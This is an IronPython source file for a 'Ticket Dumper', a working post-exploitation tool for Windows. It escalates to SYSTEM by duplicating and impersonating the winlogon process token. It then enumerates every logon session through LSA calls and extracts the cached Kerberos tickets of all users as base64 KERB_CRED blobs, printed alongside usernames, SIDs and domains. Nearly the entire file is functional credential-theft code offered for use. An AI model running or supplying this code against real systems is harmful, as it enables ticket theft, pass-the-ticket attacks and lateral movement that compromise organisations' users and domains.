##################################################
## IronPython Ticket Dumper
##################################################
## Author: Hubbl3
## Thanks to Kevin Clark for letting me base this off his csharptoolbox project
##################################################
import clr
import ctypes
import System
import base64
clr.AddReference("System.Security")
clr.AddReference("System.Runtime.InteropServices")

import System.Security.Principal as SecurityIdentity
import System.Diagnostics as Diagnostics

from System import DateTime
from System.Runtime.InteropServices import Marshal
from ctypes import wintypes
from enum import Enum

ntdll = ctypes.WinDLL('ntdll')
secur32 = ctypes.WinDLL('secur32')
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)
try:
    address = kernel32.GetProcAddress(secur32._handle, b'LsaCallAuthenticationPackage')
    if address != 0:
        print(f'Address of LsaCallAuthenticationPackage: {address}')
    else:
        print('Function not found.')
except Exception as e:
    print(f'Error: {str(e)}')

class LSA_STRING_IN(ctypes.Structure):

    #https://stackoverflow.com/questions/24640817/python-ctypes-definition-for-c-struct
    _fields_ = [('Length', wintypes.USHORT),
                ('MaximumLength',wintypes.USHORT),
                ('Buffer', ctypes.c_char_p)]

class LSA_STRING_OUT(ctypes.Structure):

    _fields_= [('Length', ctypes.c_uint16),
               ('MaximumLength',ctypes.c_uint16),
               ('Buffer', wintypes.HANDLE)]

#Could probably reuse LSA_STRING_OUT but this makes later code more readable
class LSA_UNICODE_STRING(ctypes.Structure):
    _fields_ = [('Length', ctypes.c_uint16),
                ('MaximumLength', ctypes.c_uint16),
                ('Buffer', ctypes.c_wchar_p)]


class LUID(ctypes.Structure):

    _fields_=[('LowPart', wintypes.UINT),
              ('HighPart', wintypes.INT)]

class SECURITY_HANDLE(ctypes.Structure):

    _fields_=[('LowPart', wintypes.HANDLE),
              ('HighPart', wintypes.HANDLE)]

class SECURITY_LOGON_SESSION_DATA(ctypes.Structure):

    _fields_=[('Size', wintypes.UINT),
              ('LogonId', LUID),
              ('UserName', LSA_STRING_OUT),
              ('LogonDomain', LSA_STRING_OUT),
              ('AuthenticationPackage', LSA_STRING_OUT),
              ('LogonType', wintypes.UINT),
              ('Session', wintypes.UINT),
              ('Sid', wintypes.HANDLE),
              ('LogonTime', wintypes.LARGE_INTEGER),
              ('LogonServer', LSA_STRING_OUT),
              ('DnsDomainName', LSA_STRING_OUT),
              ('Upn',LSA_STRING_OUT)]


class KERB_CRYPTO_KEY(ctypes.Structure):
    _fields_=[('KeyType',wintypes.INT),
              ('Length', wintypes.INT),
              ('Value', wintypes.HANDLE)]

class KERB_EXTERNAL_TICKET(ctypes.Structure):
    _fields_=[('ServiceName',wintypes.HANDLE),
              ('TargetName', wintypes.HANDLE),
              ('ClientName',wintypes.HANDLE),
              ('DomainName', LSA_STRING_OUT),
              ('TargetDomainName', LSA_STRING_OUT),
              ('AltTargetDomainName', LSA_STRING_OUT),
              ('SessionKey', KERB_CRYPTO_KEY),
              ('TicketFlags', ctypes.c_uint32),
              ('Flags', ctypes.c_uint32),
              ('KeyExpirationTIme', ctypes.c_int64),
              ('StartTIme', ctypes.c_int64),
              ('EndTime', ctypes.c_int64),
              ('RenewUntil', ctypes.c_int64),
              ('TimeSkew', ctypes.c_int64),
              ('EncodedTicketSize', ctypes.c_int32),
              ('EncodedTicket', wintypes.HANDLE)]

class KERB_TICKET_CACHE_INFO_EX(ctypes.Structure):
    _fields_=[('ClientName', LSA_STRING_OUT),
              ('ClientRealm', LSA_STRING_OUT),
              ('ServerName', LSA_STRING_OUT),
              ('ServerRealm', LSA_STRING_OUT),
              ('StartTime', ctypes.c_int64),
              ('EndTime', ctypes.c_int64),
              ('RenewTime', ctypes.c_int64),
              ('EncryptionType', ctypes.c_int32),
              ('TicketFlags', ctypes.c_uint32)]



class KERB_QUERY_TKT_CACHE_REQUEST(ctypes.Structure):
    _fields_=[('MessageType', wintypes.INT),
              ('LogonId', LUID)]

class KERB_QUERY_TKT_CACHE_RESPONSE(ctypes.Structure):

    _fields_=[('MessageType', wintypes.INT),
              ('NumberofTickets', wintypes.INT),
              ('Tickets', wintypes.HANDLE)]

class KERB_RETRIEVE_TKT_REQUEST(ctypes.Structure):
    _fields_=[('MessageType', wintypes.INT),
              ('LogonId', LUID),
              ('TargetName', LSA_UNICODE_STRING),
              ('TicketFlags', ctypes.c_uint32),
              ('CacheOptions', ctypes.c_uint32),
              ('EncryptionType', wintypes.INT),
              ('CredentialsHandle', SECURITY_HANDLE)]

class KERB_RETRIEVE_TKT_REQUEST2(ctypes.Structure):
    _fields_=[('MessageType', wintypes.INT),
              ('LogonId', LUID),
              ('TargetName', LSA_UNICODE_STRING),
              ('TicketFlags', ctypes.c_uint32),
              ('CacheOptions', ctypes.c_uint32),
              ('EncryptionType', wintypes.INT),
              ('CredentialsHandle', SECURITY_HANDLE)]

    def __init__(self, messageType, logonId, targetName, ticketFlags, cacheOptions,encryptionType):

        self.MessageType = messageType
        self.LogonId = logonId
        self.TargetName = targetName
        self.TicketFlags = ticketFlags
        self.CacheOptions = cacheOptions
        self.EncryptionType = encryptionType

class KERB_RETRIEVE_TKT_RESPONSE(ctypes.Structure):
    _fields_=[('Ticket',KERB_EXTERNAL_TICKET)]

class TicketFlags(Enum):

    reserved = 2147483648
    forwardable = 0x40000000
    forwarded = 0x20000000
    proxiable = 0x10000000
    proxy = 0x08000000
    may_postdate = 0x04000000
    postdated = 0x02000000
    invalid = 0x01000000
    renewable = 0x00800000
    initial = 0x00400000
    pre_authent = 0x00200000
    hw_authent = 0x00100000
    ok_as_delegate = 0x00040000
    anonymous = 0x00020000
    name_canonicalize = 0x00010000
    #cname_in_pa_data = 0x00040000
    enc_pa_rep = 0x00010000
    reserved1 = 0x00000001
    empty = 0x00000000

class KRB_TICKET(ctypes.Structure):
    _fields_ = [('ClientName', ctypes.c_wchar_p),
                ('ClientRealm', ctypes.c_wchar_p),
                ('ServerName', ctypes.c_wchar_p),
                ('ServerRealm', ctypes.c_wchar_p),
                ('StartTime', ctypes.c_int64),
                ('EndTime', ctypes.c_int64),
                ('RenewTime', ctypes.c_int64),
                ('EncryptionType', ctypes.c_int32),
                ('TicketFlags', ctypes.c_uint32),
                ('TicketData', ctypes.POINTER(ctypes.c_ubyte))]

class LogonSessionData:
    def __init__(self, logon_id=None, username="", logon_domain="", auth_package="", logon_type=0, session=0, sid=None, logon_time=None, logon_server="", dns_domain_name="", upn=""):
        self.LogonId = logon_id if logon_id is not None else LUID()
        self.UserName = username
        self.LogonDomain = logon_domain
        self.AuthenticationPackage = auth_package
        self.LogonType = logon_type
        self.Session = session
        self.Sid = sid if sid is not None else System.Security.Principal.SecurityIdentifier('S-1-5-21-3623811015-3361044348-30300820-1013') #Random valid SID from ChatGPT. Requires a valid SID to initialize object but value will be overwritten when we use th eobject later
        self.LogonTime = logon_time if logon_time is not None else DateTime.Now
        self.LogonServer = logon_server
        self.DnsDomainName = dns_domain_name
        self.Upn = upn

def isAdministrator()->bool:

    identity = SecurityIdentity.WindowsIdentity.GetCurrent()
    principal = SecurityIdentity.WindowsPrincipal(identity)
    isAdmin = principal.IsInRole(SecurityIdentity.WindowsBuiltInRole.Administrator)
    return isAdmin

def Elevate()->bool:

    processes = Diagnostics.Process.GetProcessesByName("winlogon")
    handle  = processes[0].Handle

    #wintypes.HANDLE is equivalent to IntPtr
    hToken = wintypes.HANDLE()

    result = advapi32.OpenProcessToken(handle, 0x0002, ctypes.byref(hToken))
    if not result:
        print("[!] OpenProcessToken failed")
        return False

    hDupToken = wintypes.HANDLE()
    result = advapi32.DuplicateToken(hToken, 2, ctypes.byref(hDupToken))
    if not result:
        print("[!] DuplicateToken failed")
        return False

    result = advapi32.ImpersonateLoggedOnUser(hDupToken)
    if not result:
        print("[!] ImpersonateLoggedOnUser failed")
        return False

    #close handles
    kernel32.CloseHandle(hToken)
    kernel32.CloseHandle(hDupToken)

    currentSid = SecurityIdentity.WindowsIdentity.GetCurrent().User
    if not currentSid.IsWellKnown(SecurityIdentity.WellKnownSidType.LocalSystemSid):
        return False

    return True

def GetLogonSessions():

    logonSessionCount = wintypes.INT()
    logonSessionList = wintypes.HANDLE()
    result = secur32.LsaEnumerateLogonSessions(ctypes.byref(logonSessionCount), ctypes.byref(logonSessionList))

    if result != 0:
        print("Error enumerating logon sessions: " + result)

    currentLogonSession =  logonSessionList
    #Because as far as I know IronPython can't create blittable Structs we need to create a struct pointer
    pSessionData = ctypes.POINTER(SECURITY_LOGON_SESSION_DATA)()
    sessionDataList = []
    for i in range(logonSessionCount.value):

        secur32.LsaGetLogonSessionData(currentLogonSession, ctypes.byref(pSessionData))
        #Create a SECURITY_LOGON_SESSION_DATA struct object. We could retrieve the data directly from contents but this makes the code more readable
        sessionData = pSessionData.contents


        logonSessionData = LogonSessionData(
            logon_id= sessionData.LogonId,
            username= Marshal.PtrToStringUni(System.IntPtr(sessionData.UserName.Buffer), sessionData.UserName.Length // 2),
            logon_domain= Marshal.PtrToStringUni(System.IntPtr(sessionData.LogonDomain.Buffer), sessionData.LogonDomain.Length // 2),
            auth_package= Marshal.PtrToStringUni(System.IntPtr(sessionData.AuthenticationPackage.Buffer), sessionData.AuthenticationPackage.Length // 2),
            logon_type= sessionData.LogonType,
            session= sessionData.Session,
            logon_time = DateTime.FromFileTime(abs(sessionData.LogonTime)),
            logon_server= Marshal.PtrToStringUni(System.IntPtr(sessionData.LogonServer.Buffer), sessionData.LogonServer.Length // 2),
            dns_domain_name= Marshal.PtrToStringUni(System.IntPtr(sessionData.DnsDomainName.Buffer), sessionData.DnsDomainName.Length // 2),
            upn= Marshal.PtrToStringUni(System.IntPtr(sessionData.Upn.Buffer), sessionData.Upn.Length // 2),
            sid= None if sessionData.Sid == 0 else System.Security.Principal.SecurityIdentifier(System.IntPtr(sessionData.Sid))
        )

        sessionDataList.append(logonSessionData)

        #free memory
        secur32.LsaFreeReturnBuffer(pSessionData)
        currentLogonSession = ctypes.c_void_p(currentLogonSession.value + ctypes.sizeof(LUID))

    secur32.LsaFreeReturnBuffer(logonSessionList)
    return sessionDataList
def ValidateTime(timeInt):
    try:
        time = DateTime.FromFileTime(timeInt).ToString()
    except:
        time = DateTime.FromFileTime(0).ToString()
    return time

#IronPython doesn't enforce type hinting. lsaHandle should be an IntPtr and kerberosAuthenticationPAckageIdentifier an int
def GetTickets(lsaHandle, kerberosAuthenticationPackageIdentifier):

    for logonSession in GetLogonSessions():

        kerbQueryTKTCacheRequest = KERB_QUERY_TKT_CACHE_REQUEST()

        kerbQueryTKTCacheRequest.MessageType = 14 #14 is KerbQueryTicketCacheExMessage
        kerbQueryTKTCacheRequest.LogonId = logonSession.LogonId
        #must use ctypes.byref(). ctypes.pointer creates a python pointer to a ctypes pointer and causes the call to fail
        kerbQueryTKTCacheRequestPtr = ctypes.byref(kerbQueryTKTCacheRequest)
        ticketsPointer = ctypes.c_void_p()
        returnBufferLength = ctypes.c_uint32()
        protocolStatus = ctypes.c_uint32()
        size = ctypes.sizeof(kerbQueryTKTCacheRequest)
        result = secur32.LsaCallAuthenticationPackage(
            lsaHandle,
            kerberosAuthenticationPackageIdentifier,
            kerbQueryTKTCacheRequestPtr,
            size,
            ctypes.byref(ticketsPointer),
            ctypes.byref(returnBufferLength),
            ctypes.byref(protocolStatus))
        if result !=0:
            status = ntdll.RtlNtStatusToDosError(result)
            print(ctypes.WinError(status))
            print("[!] LsaCallAuthenticationPackage failed")
            return False



        if ticketsPointer.value == 0:
            print("[*] Failed to obtain ticketsPointer for "+ str(logonSession.LogonId.LowPart))
        else:

            #takes the place of marshalptrtostructure
            casted = ctypes.cast(ticketsPointer, ctypes.POINTER(KERB_QUERY_TKT_CACHE_RESPONSE))
            kerbQueryTKTCacheResponse = casted.contents

            #Ctypes structures have additional padding that can cause issues. Set for base64 system
            dataSize = ctypes.sizeof(KERB_TICKET_CACHE_INFO_EX())

            for i in range(kerbQueryTKTCacheResponse.NumberofTickets-1):

                ticketAdress = ticketsPointer.value + 8+(i) * dataSize
                ticketPtr = ctypes.c_void_p(ticketAdress)
                castedTicket = ctypes.cast(ticketPtr, ctypes.POINTER(KERB_TICKET_CACHE_INFO_EX))
                ticketCacheResult = castedTicket.contents
                #for some reason occasionally getting invalid FileTimes. Will fix later. for now dump 0 in
                serverName = Marshal.PtrToStringUni(System.IntPtr(ticketCacheResult.ServerName.Buffer), ticketCacheResult.ServerName.Length // 2)
                serverRealm = Marshal.PtrToStringUni(System.IntPtr(ticketCacheResult.ServerRealm.Buffer), ticketCacheResult.ServerRealm.Length // 2)
                clientName = Marshal.PtrToStringUni(System.IntPtr(ticketCacheResult.ClientName.Buffer), ticketCacheResult.ClientName.Length // 2)
                lsaHandle2 = wintypes.HANDLE()
                result = secur32.LsaConnectUntrusted(ctypes.byref(lsaHandle2))
                KBA = kerberosAuthenticationPackageIdentifier
                ticketData = base64.b64encode(bytes(ExtractTickets(lsaHandle2, KBA, kerbQueryTKTCacheRequest.LogonId, serverName)))
                print("ticketdata type: " + str(ticketData.GetType()))
                print("Username        : " + logonSession.UserName)
                print("UPN             : " + logonSession.Upn)
                print("SID             : " + logonSession.Sid.ToString())
                print("Session         : " + logonSession.Session.ToString())
                print("Logon Server    : " + logonSession.LogonServer)
                print("Logon Domain    : " + logonSession.LogonDomain)
                print("Logon Time      : " + logonSession.LogonTime.ToString())
                print("Logon Type      : " + logonSession.LogonType.ToString())
                print("Auth Package    : " + logonSession.AuthenticationPackage.ToString())
                print("----------------:")
                print("Start Time      : " + ValidateTime(ticketCacheResult.StartTime))
                print("End Time        : " + ValidateTime(ticketCacheResult.EndTime))
                print("Renew Time      : " + ValidateTime(ticketCacheResult.RenewTime))
                print("Ticket Flags    : " + ticketCacheResult.TicketFlags.ToString())
                print("Encryption Type : " + ticketCacheResult.EncryptionType.ToString())
                print("Server Name     : " + serverName)
                print("Server Realm    : " + serverRealm)
                print("Client Name     : " + clientName)
                print("Ticket Data     : " + ticketData.decode('ascii'))
                print("================================================================")
            secur32.LsaFreeReturnBuffer(kerbQueryTKTCacheRequest)

def ExtractTickets(lsaHandle, kerberosAuthenticationPackageIdentifier, logonId, serverName):
    request = KERB_RETRIEVE_TKT_REQUEST()
    response = KERB_RETRIEVE_TKT_RESPONSE()
    responsePointer = ctypes.c_void_p()
    returnBufferLength2 = ctypes.c_uint32()
    protocolStatus2 = ctypes.c_uint32()

    # Initialize request
    request.MessageType = 0x8  # Set appropriate message type
    request.LogonId = logonId
    request.TicketFlags = 0x0  # Use default ticket flags
    request.CacheOptions = 0x8  # KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
    request.EncryptionType = 0x0  # Use default encryption type

    # Handling the targetName as LSA_UNICODE_STRING
    targetName = LSA_UNICODE_STRING()
    targetName.Length = ctypes.c_uint16(serverName.Length*2)
    targetName.MaximumLength = ctypes.c_uint16(targetName.Length +2)
    unicodeBuffer = ctypes.create_unicode_buffer(serverName)
    targetName.Buffer = ctypes.cast(unicodeBuffer, ctypes.c_wchar_p)
    request.TargetName = targetName

    # referenced Nanorubeus for this next part
    # Create a buffer of the right size
    structSize = ctypes.sizeof(KERB_RETRIEVE_TKT_REQUEST)+ targetName.MaximumLength
    requestBuffer = ctypes.create_string_buffer(structSize)
    #copy the request struct to the buffer

    ctypes.memmove(requestBuffer, ctypes.addressof(request), ctypes.sizeof(request))
    requestPtr = ctypes.byref(requestBuffer)

    # Copy targetName buffer to the request structure manually
    targetNameBufferPtr = ctypes.c_void_p(ctypes.addressof(requestBuffer) + ctypes.sizeof(KERB_RETRIEVE_TKT_REQUEST))
    ctypes.memmove(targetNameBufferPtr, targetName.Buffer, targetName.MaximumLength)

    contentsPtr = ctypes.cast(requestBuffer, ctypes.POINTER(KERB_RETRIEVE_TKT_REQUEST))
    contentsPtr.contents.TargetName.Buffer = ctypes.cast(targetNameBufferPtr, ctypes.c_wchar_p)



    result = secur32.LsaCallAuthenticationPackage(
        lsaHandle,
        kerberosAuthenticationPackageIdentifier,
        requestPtr,
        structSize,
        ctypes.byref(responsePointer),
        ctypes.byref(returnBufferLength2),
        ctypes.byref(protocolStatus2)
    )
    if result == 0 and responsePointer.value != 0 and returnBufferLength2.value != 0:
        print("Ticket extraction successful for {0}.".format(serverName))
        response = ctypes.cast(responsePointer, ctypes.POINTER(KERB_RETRIEVE_TKT_RESPONSE))
        ticketSize = response.contents.Ticket.EncodedTicketSize
        encodedTicket = (ctypes.c_byte * ticketSize)()
        ctypes.memmove(ctypes.addressof(encodedTicket), response.contents.Ticket.EncodedTicket, ticketSize)
        secur32.LsaFreeReturnBuffer(responsePointer)
        Marshal.FreeHGlobal(System.IntPtr(ctypes.addressof(requestBuffer)))
        return encodedTicket
    else:
        print("Failed to extract ticket for {0}. ResultCode: {1}, ProtocolStatus: {2}".format(serverName, result, protocolStatus2.value))
        print(responsePointer)
        print(returnBufferLength2)
        if -2147483648 <= protocolStatus2.value <= 2147483647:
            win_error = ntdll.RtlNtStatusToDosError(protocolStatus2.value)
            print("Windows Error Code:", win_error)
        else:
            print("Invalid NTSTATUS Code:", protocolStatus2.value)
        return "Fail"

def main():

    if not isAdministrator():
        print("[!] must run in an elevated context")
        return

    if not Elevate():
        print("[!] Could not Elevate to System")
        return
    print("successfully elevated")

    #Get Handle to LSA
    lsaHandle = wintypes.HANDLE()

    if secur32.LsaConnectUntrusted(ctypes.byref(lsaHandle)) != 0:
        print("[!] LsaConnectUntrusted failed")
        advapi32.RevertToSelf()
        return
    kerberosAuthenticationPackageIdentifier = wintypes.ULONG()
    name = "kerberos"
    encodedName = name.encode('ascii')
    LSAString = LSA_STRING_IN()
    #Win API are very particular on types so cast everything to make sure they are correct
    LSAString.Length = wintypes.USHORT(len(encodedName))
    LSAString.MaximumLength = wintypes.USHORT(len(encodedName) + 1)
    LSAString.Buffer = encodedName
    if secur32.LsaLookupAuthenticationPackage(lsaHandle, ctypes.byref(LSAString), ctypes.byref(kerberosAuthenticationPackageIdentifier)) != 0:
        print("[!] LsaLookupAuthenticationPackage failed")
        advapi32.RevertToSelf()
        return
    GetTickets(lsaHandle,kerberosAuthenticationPackageIdentifier)

main()
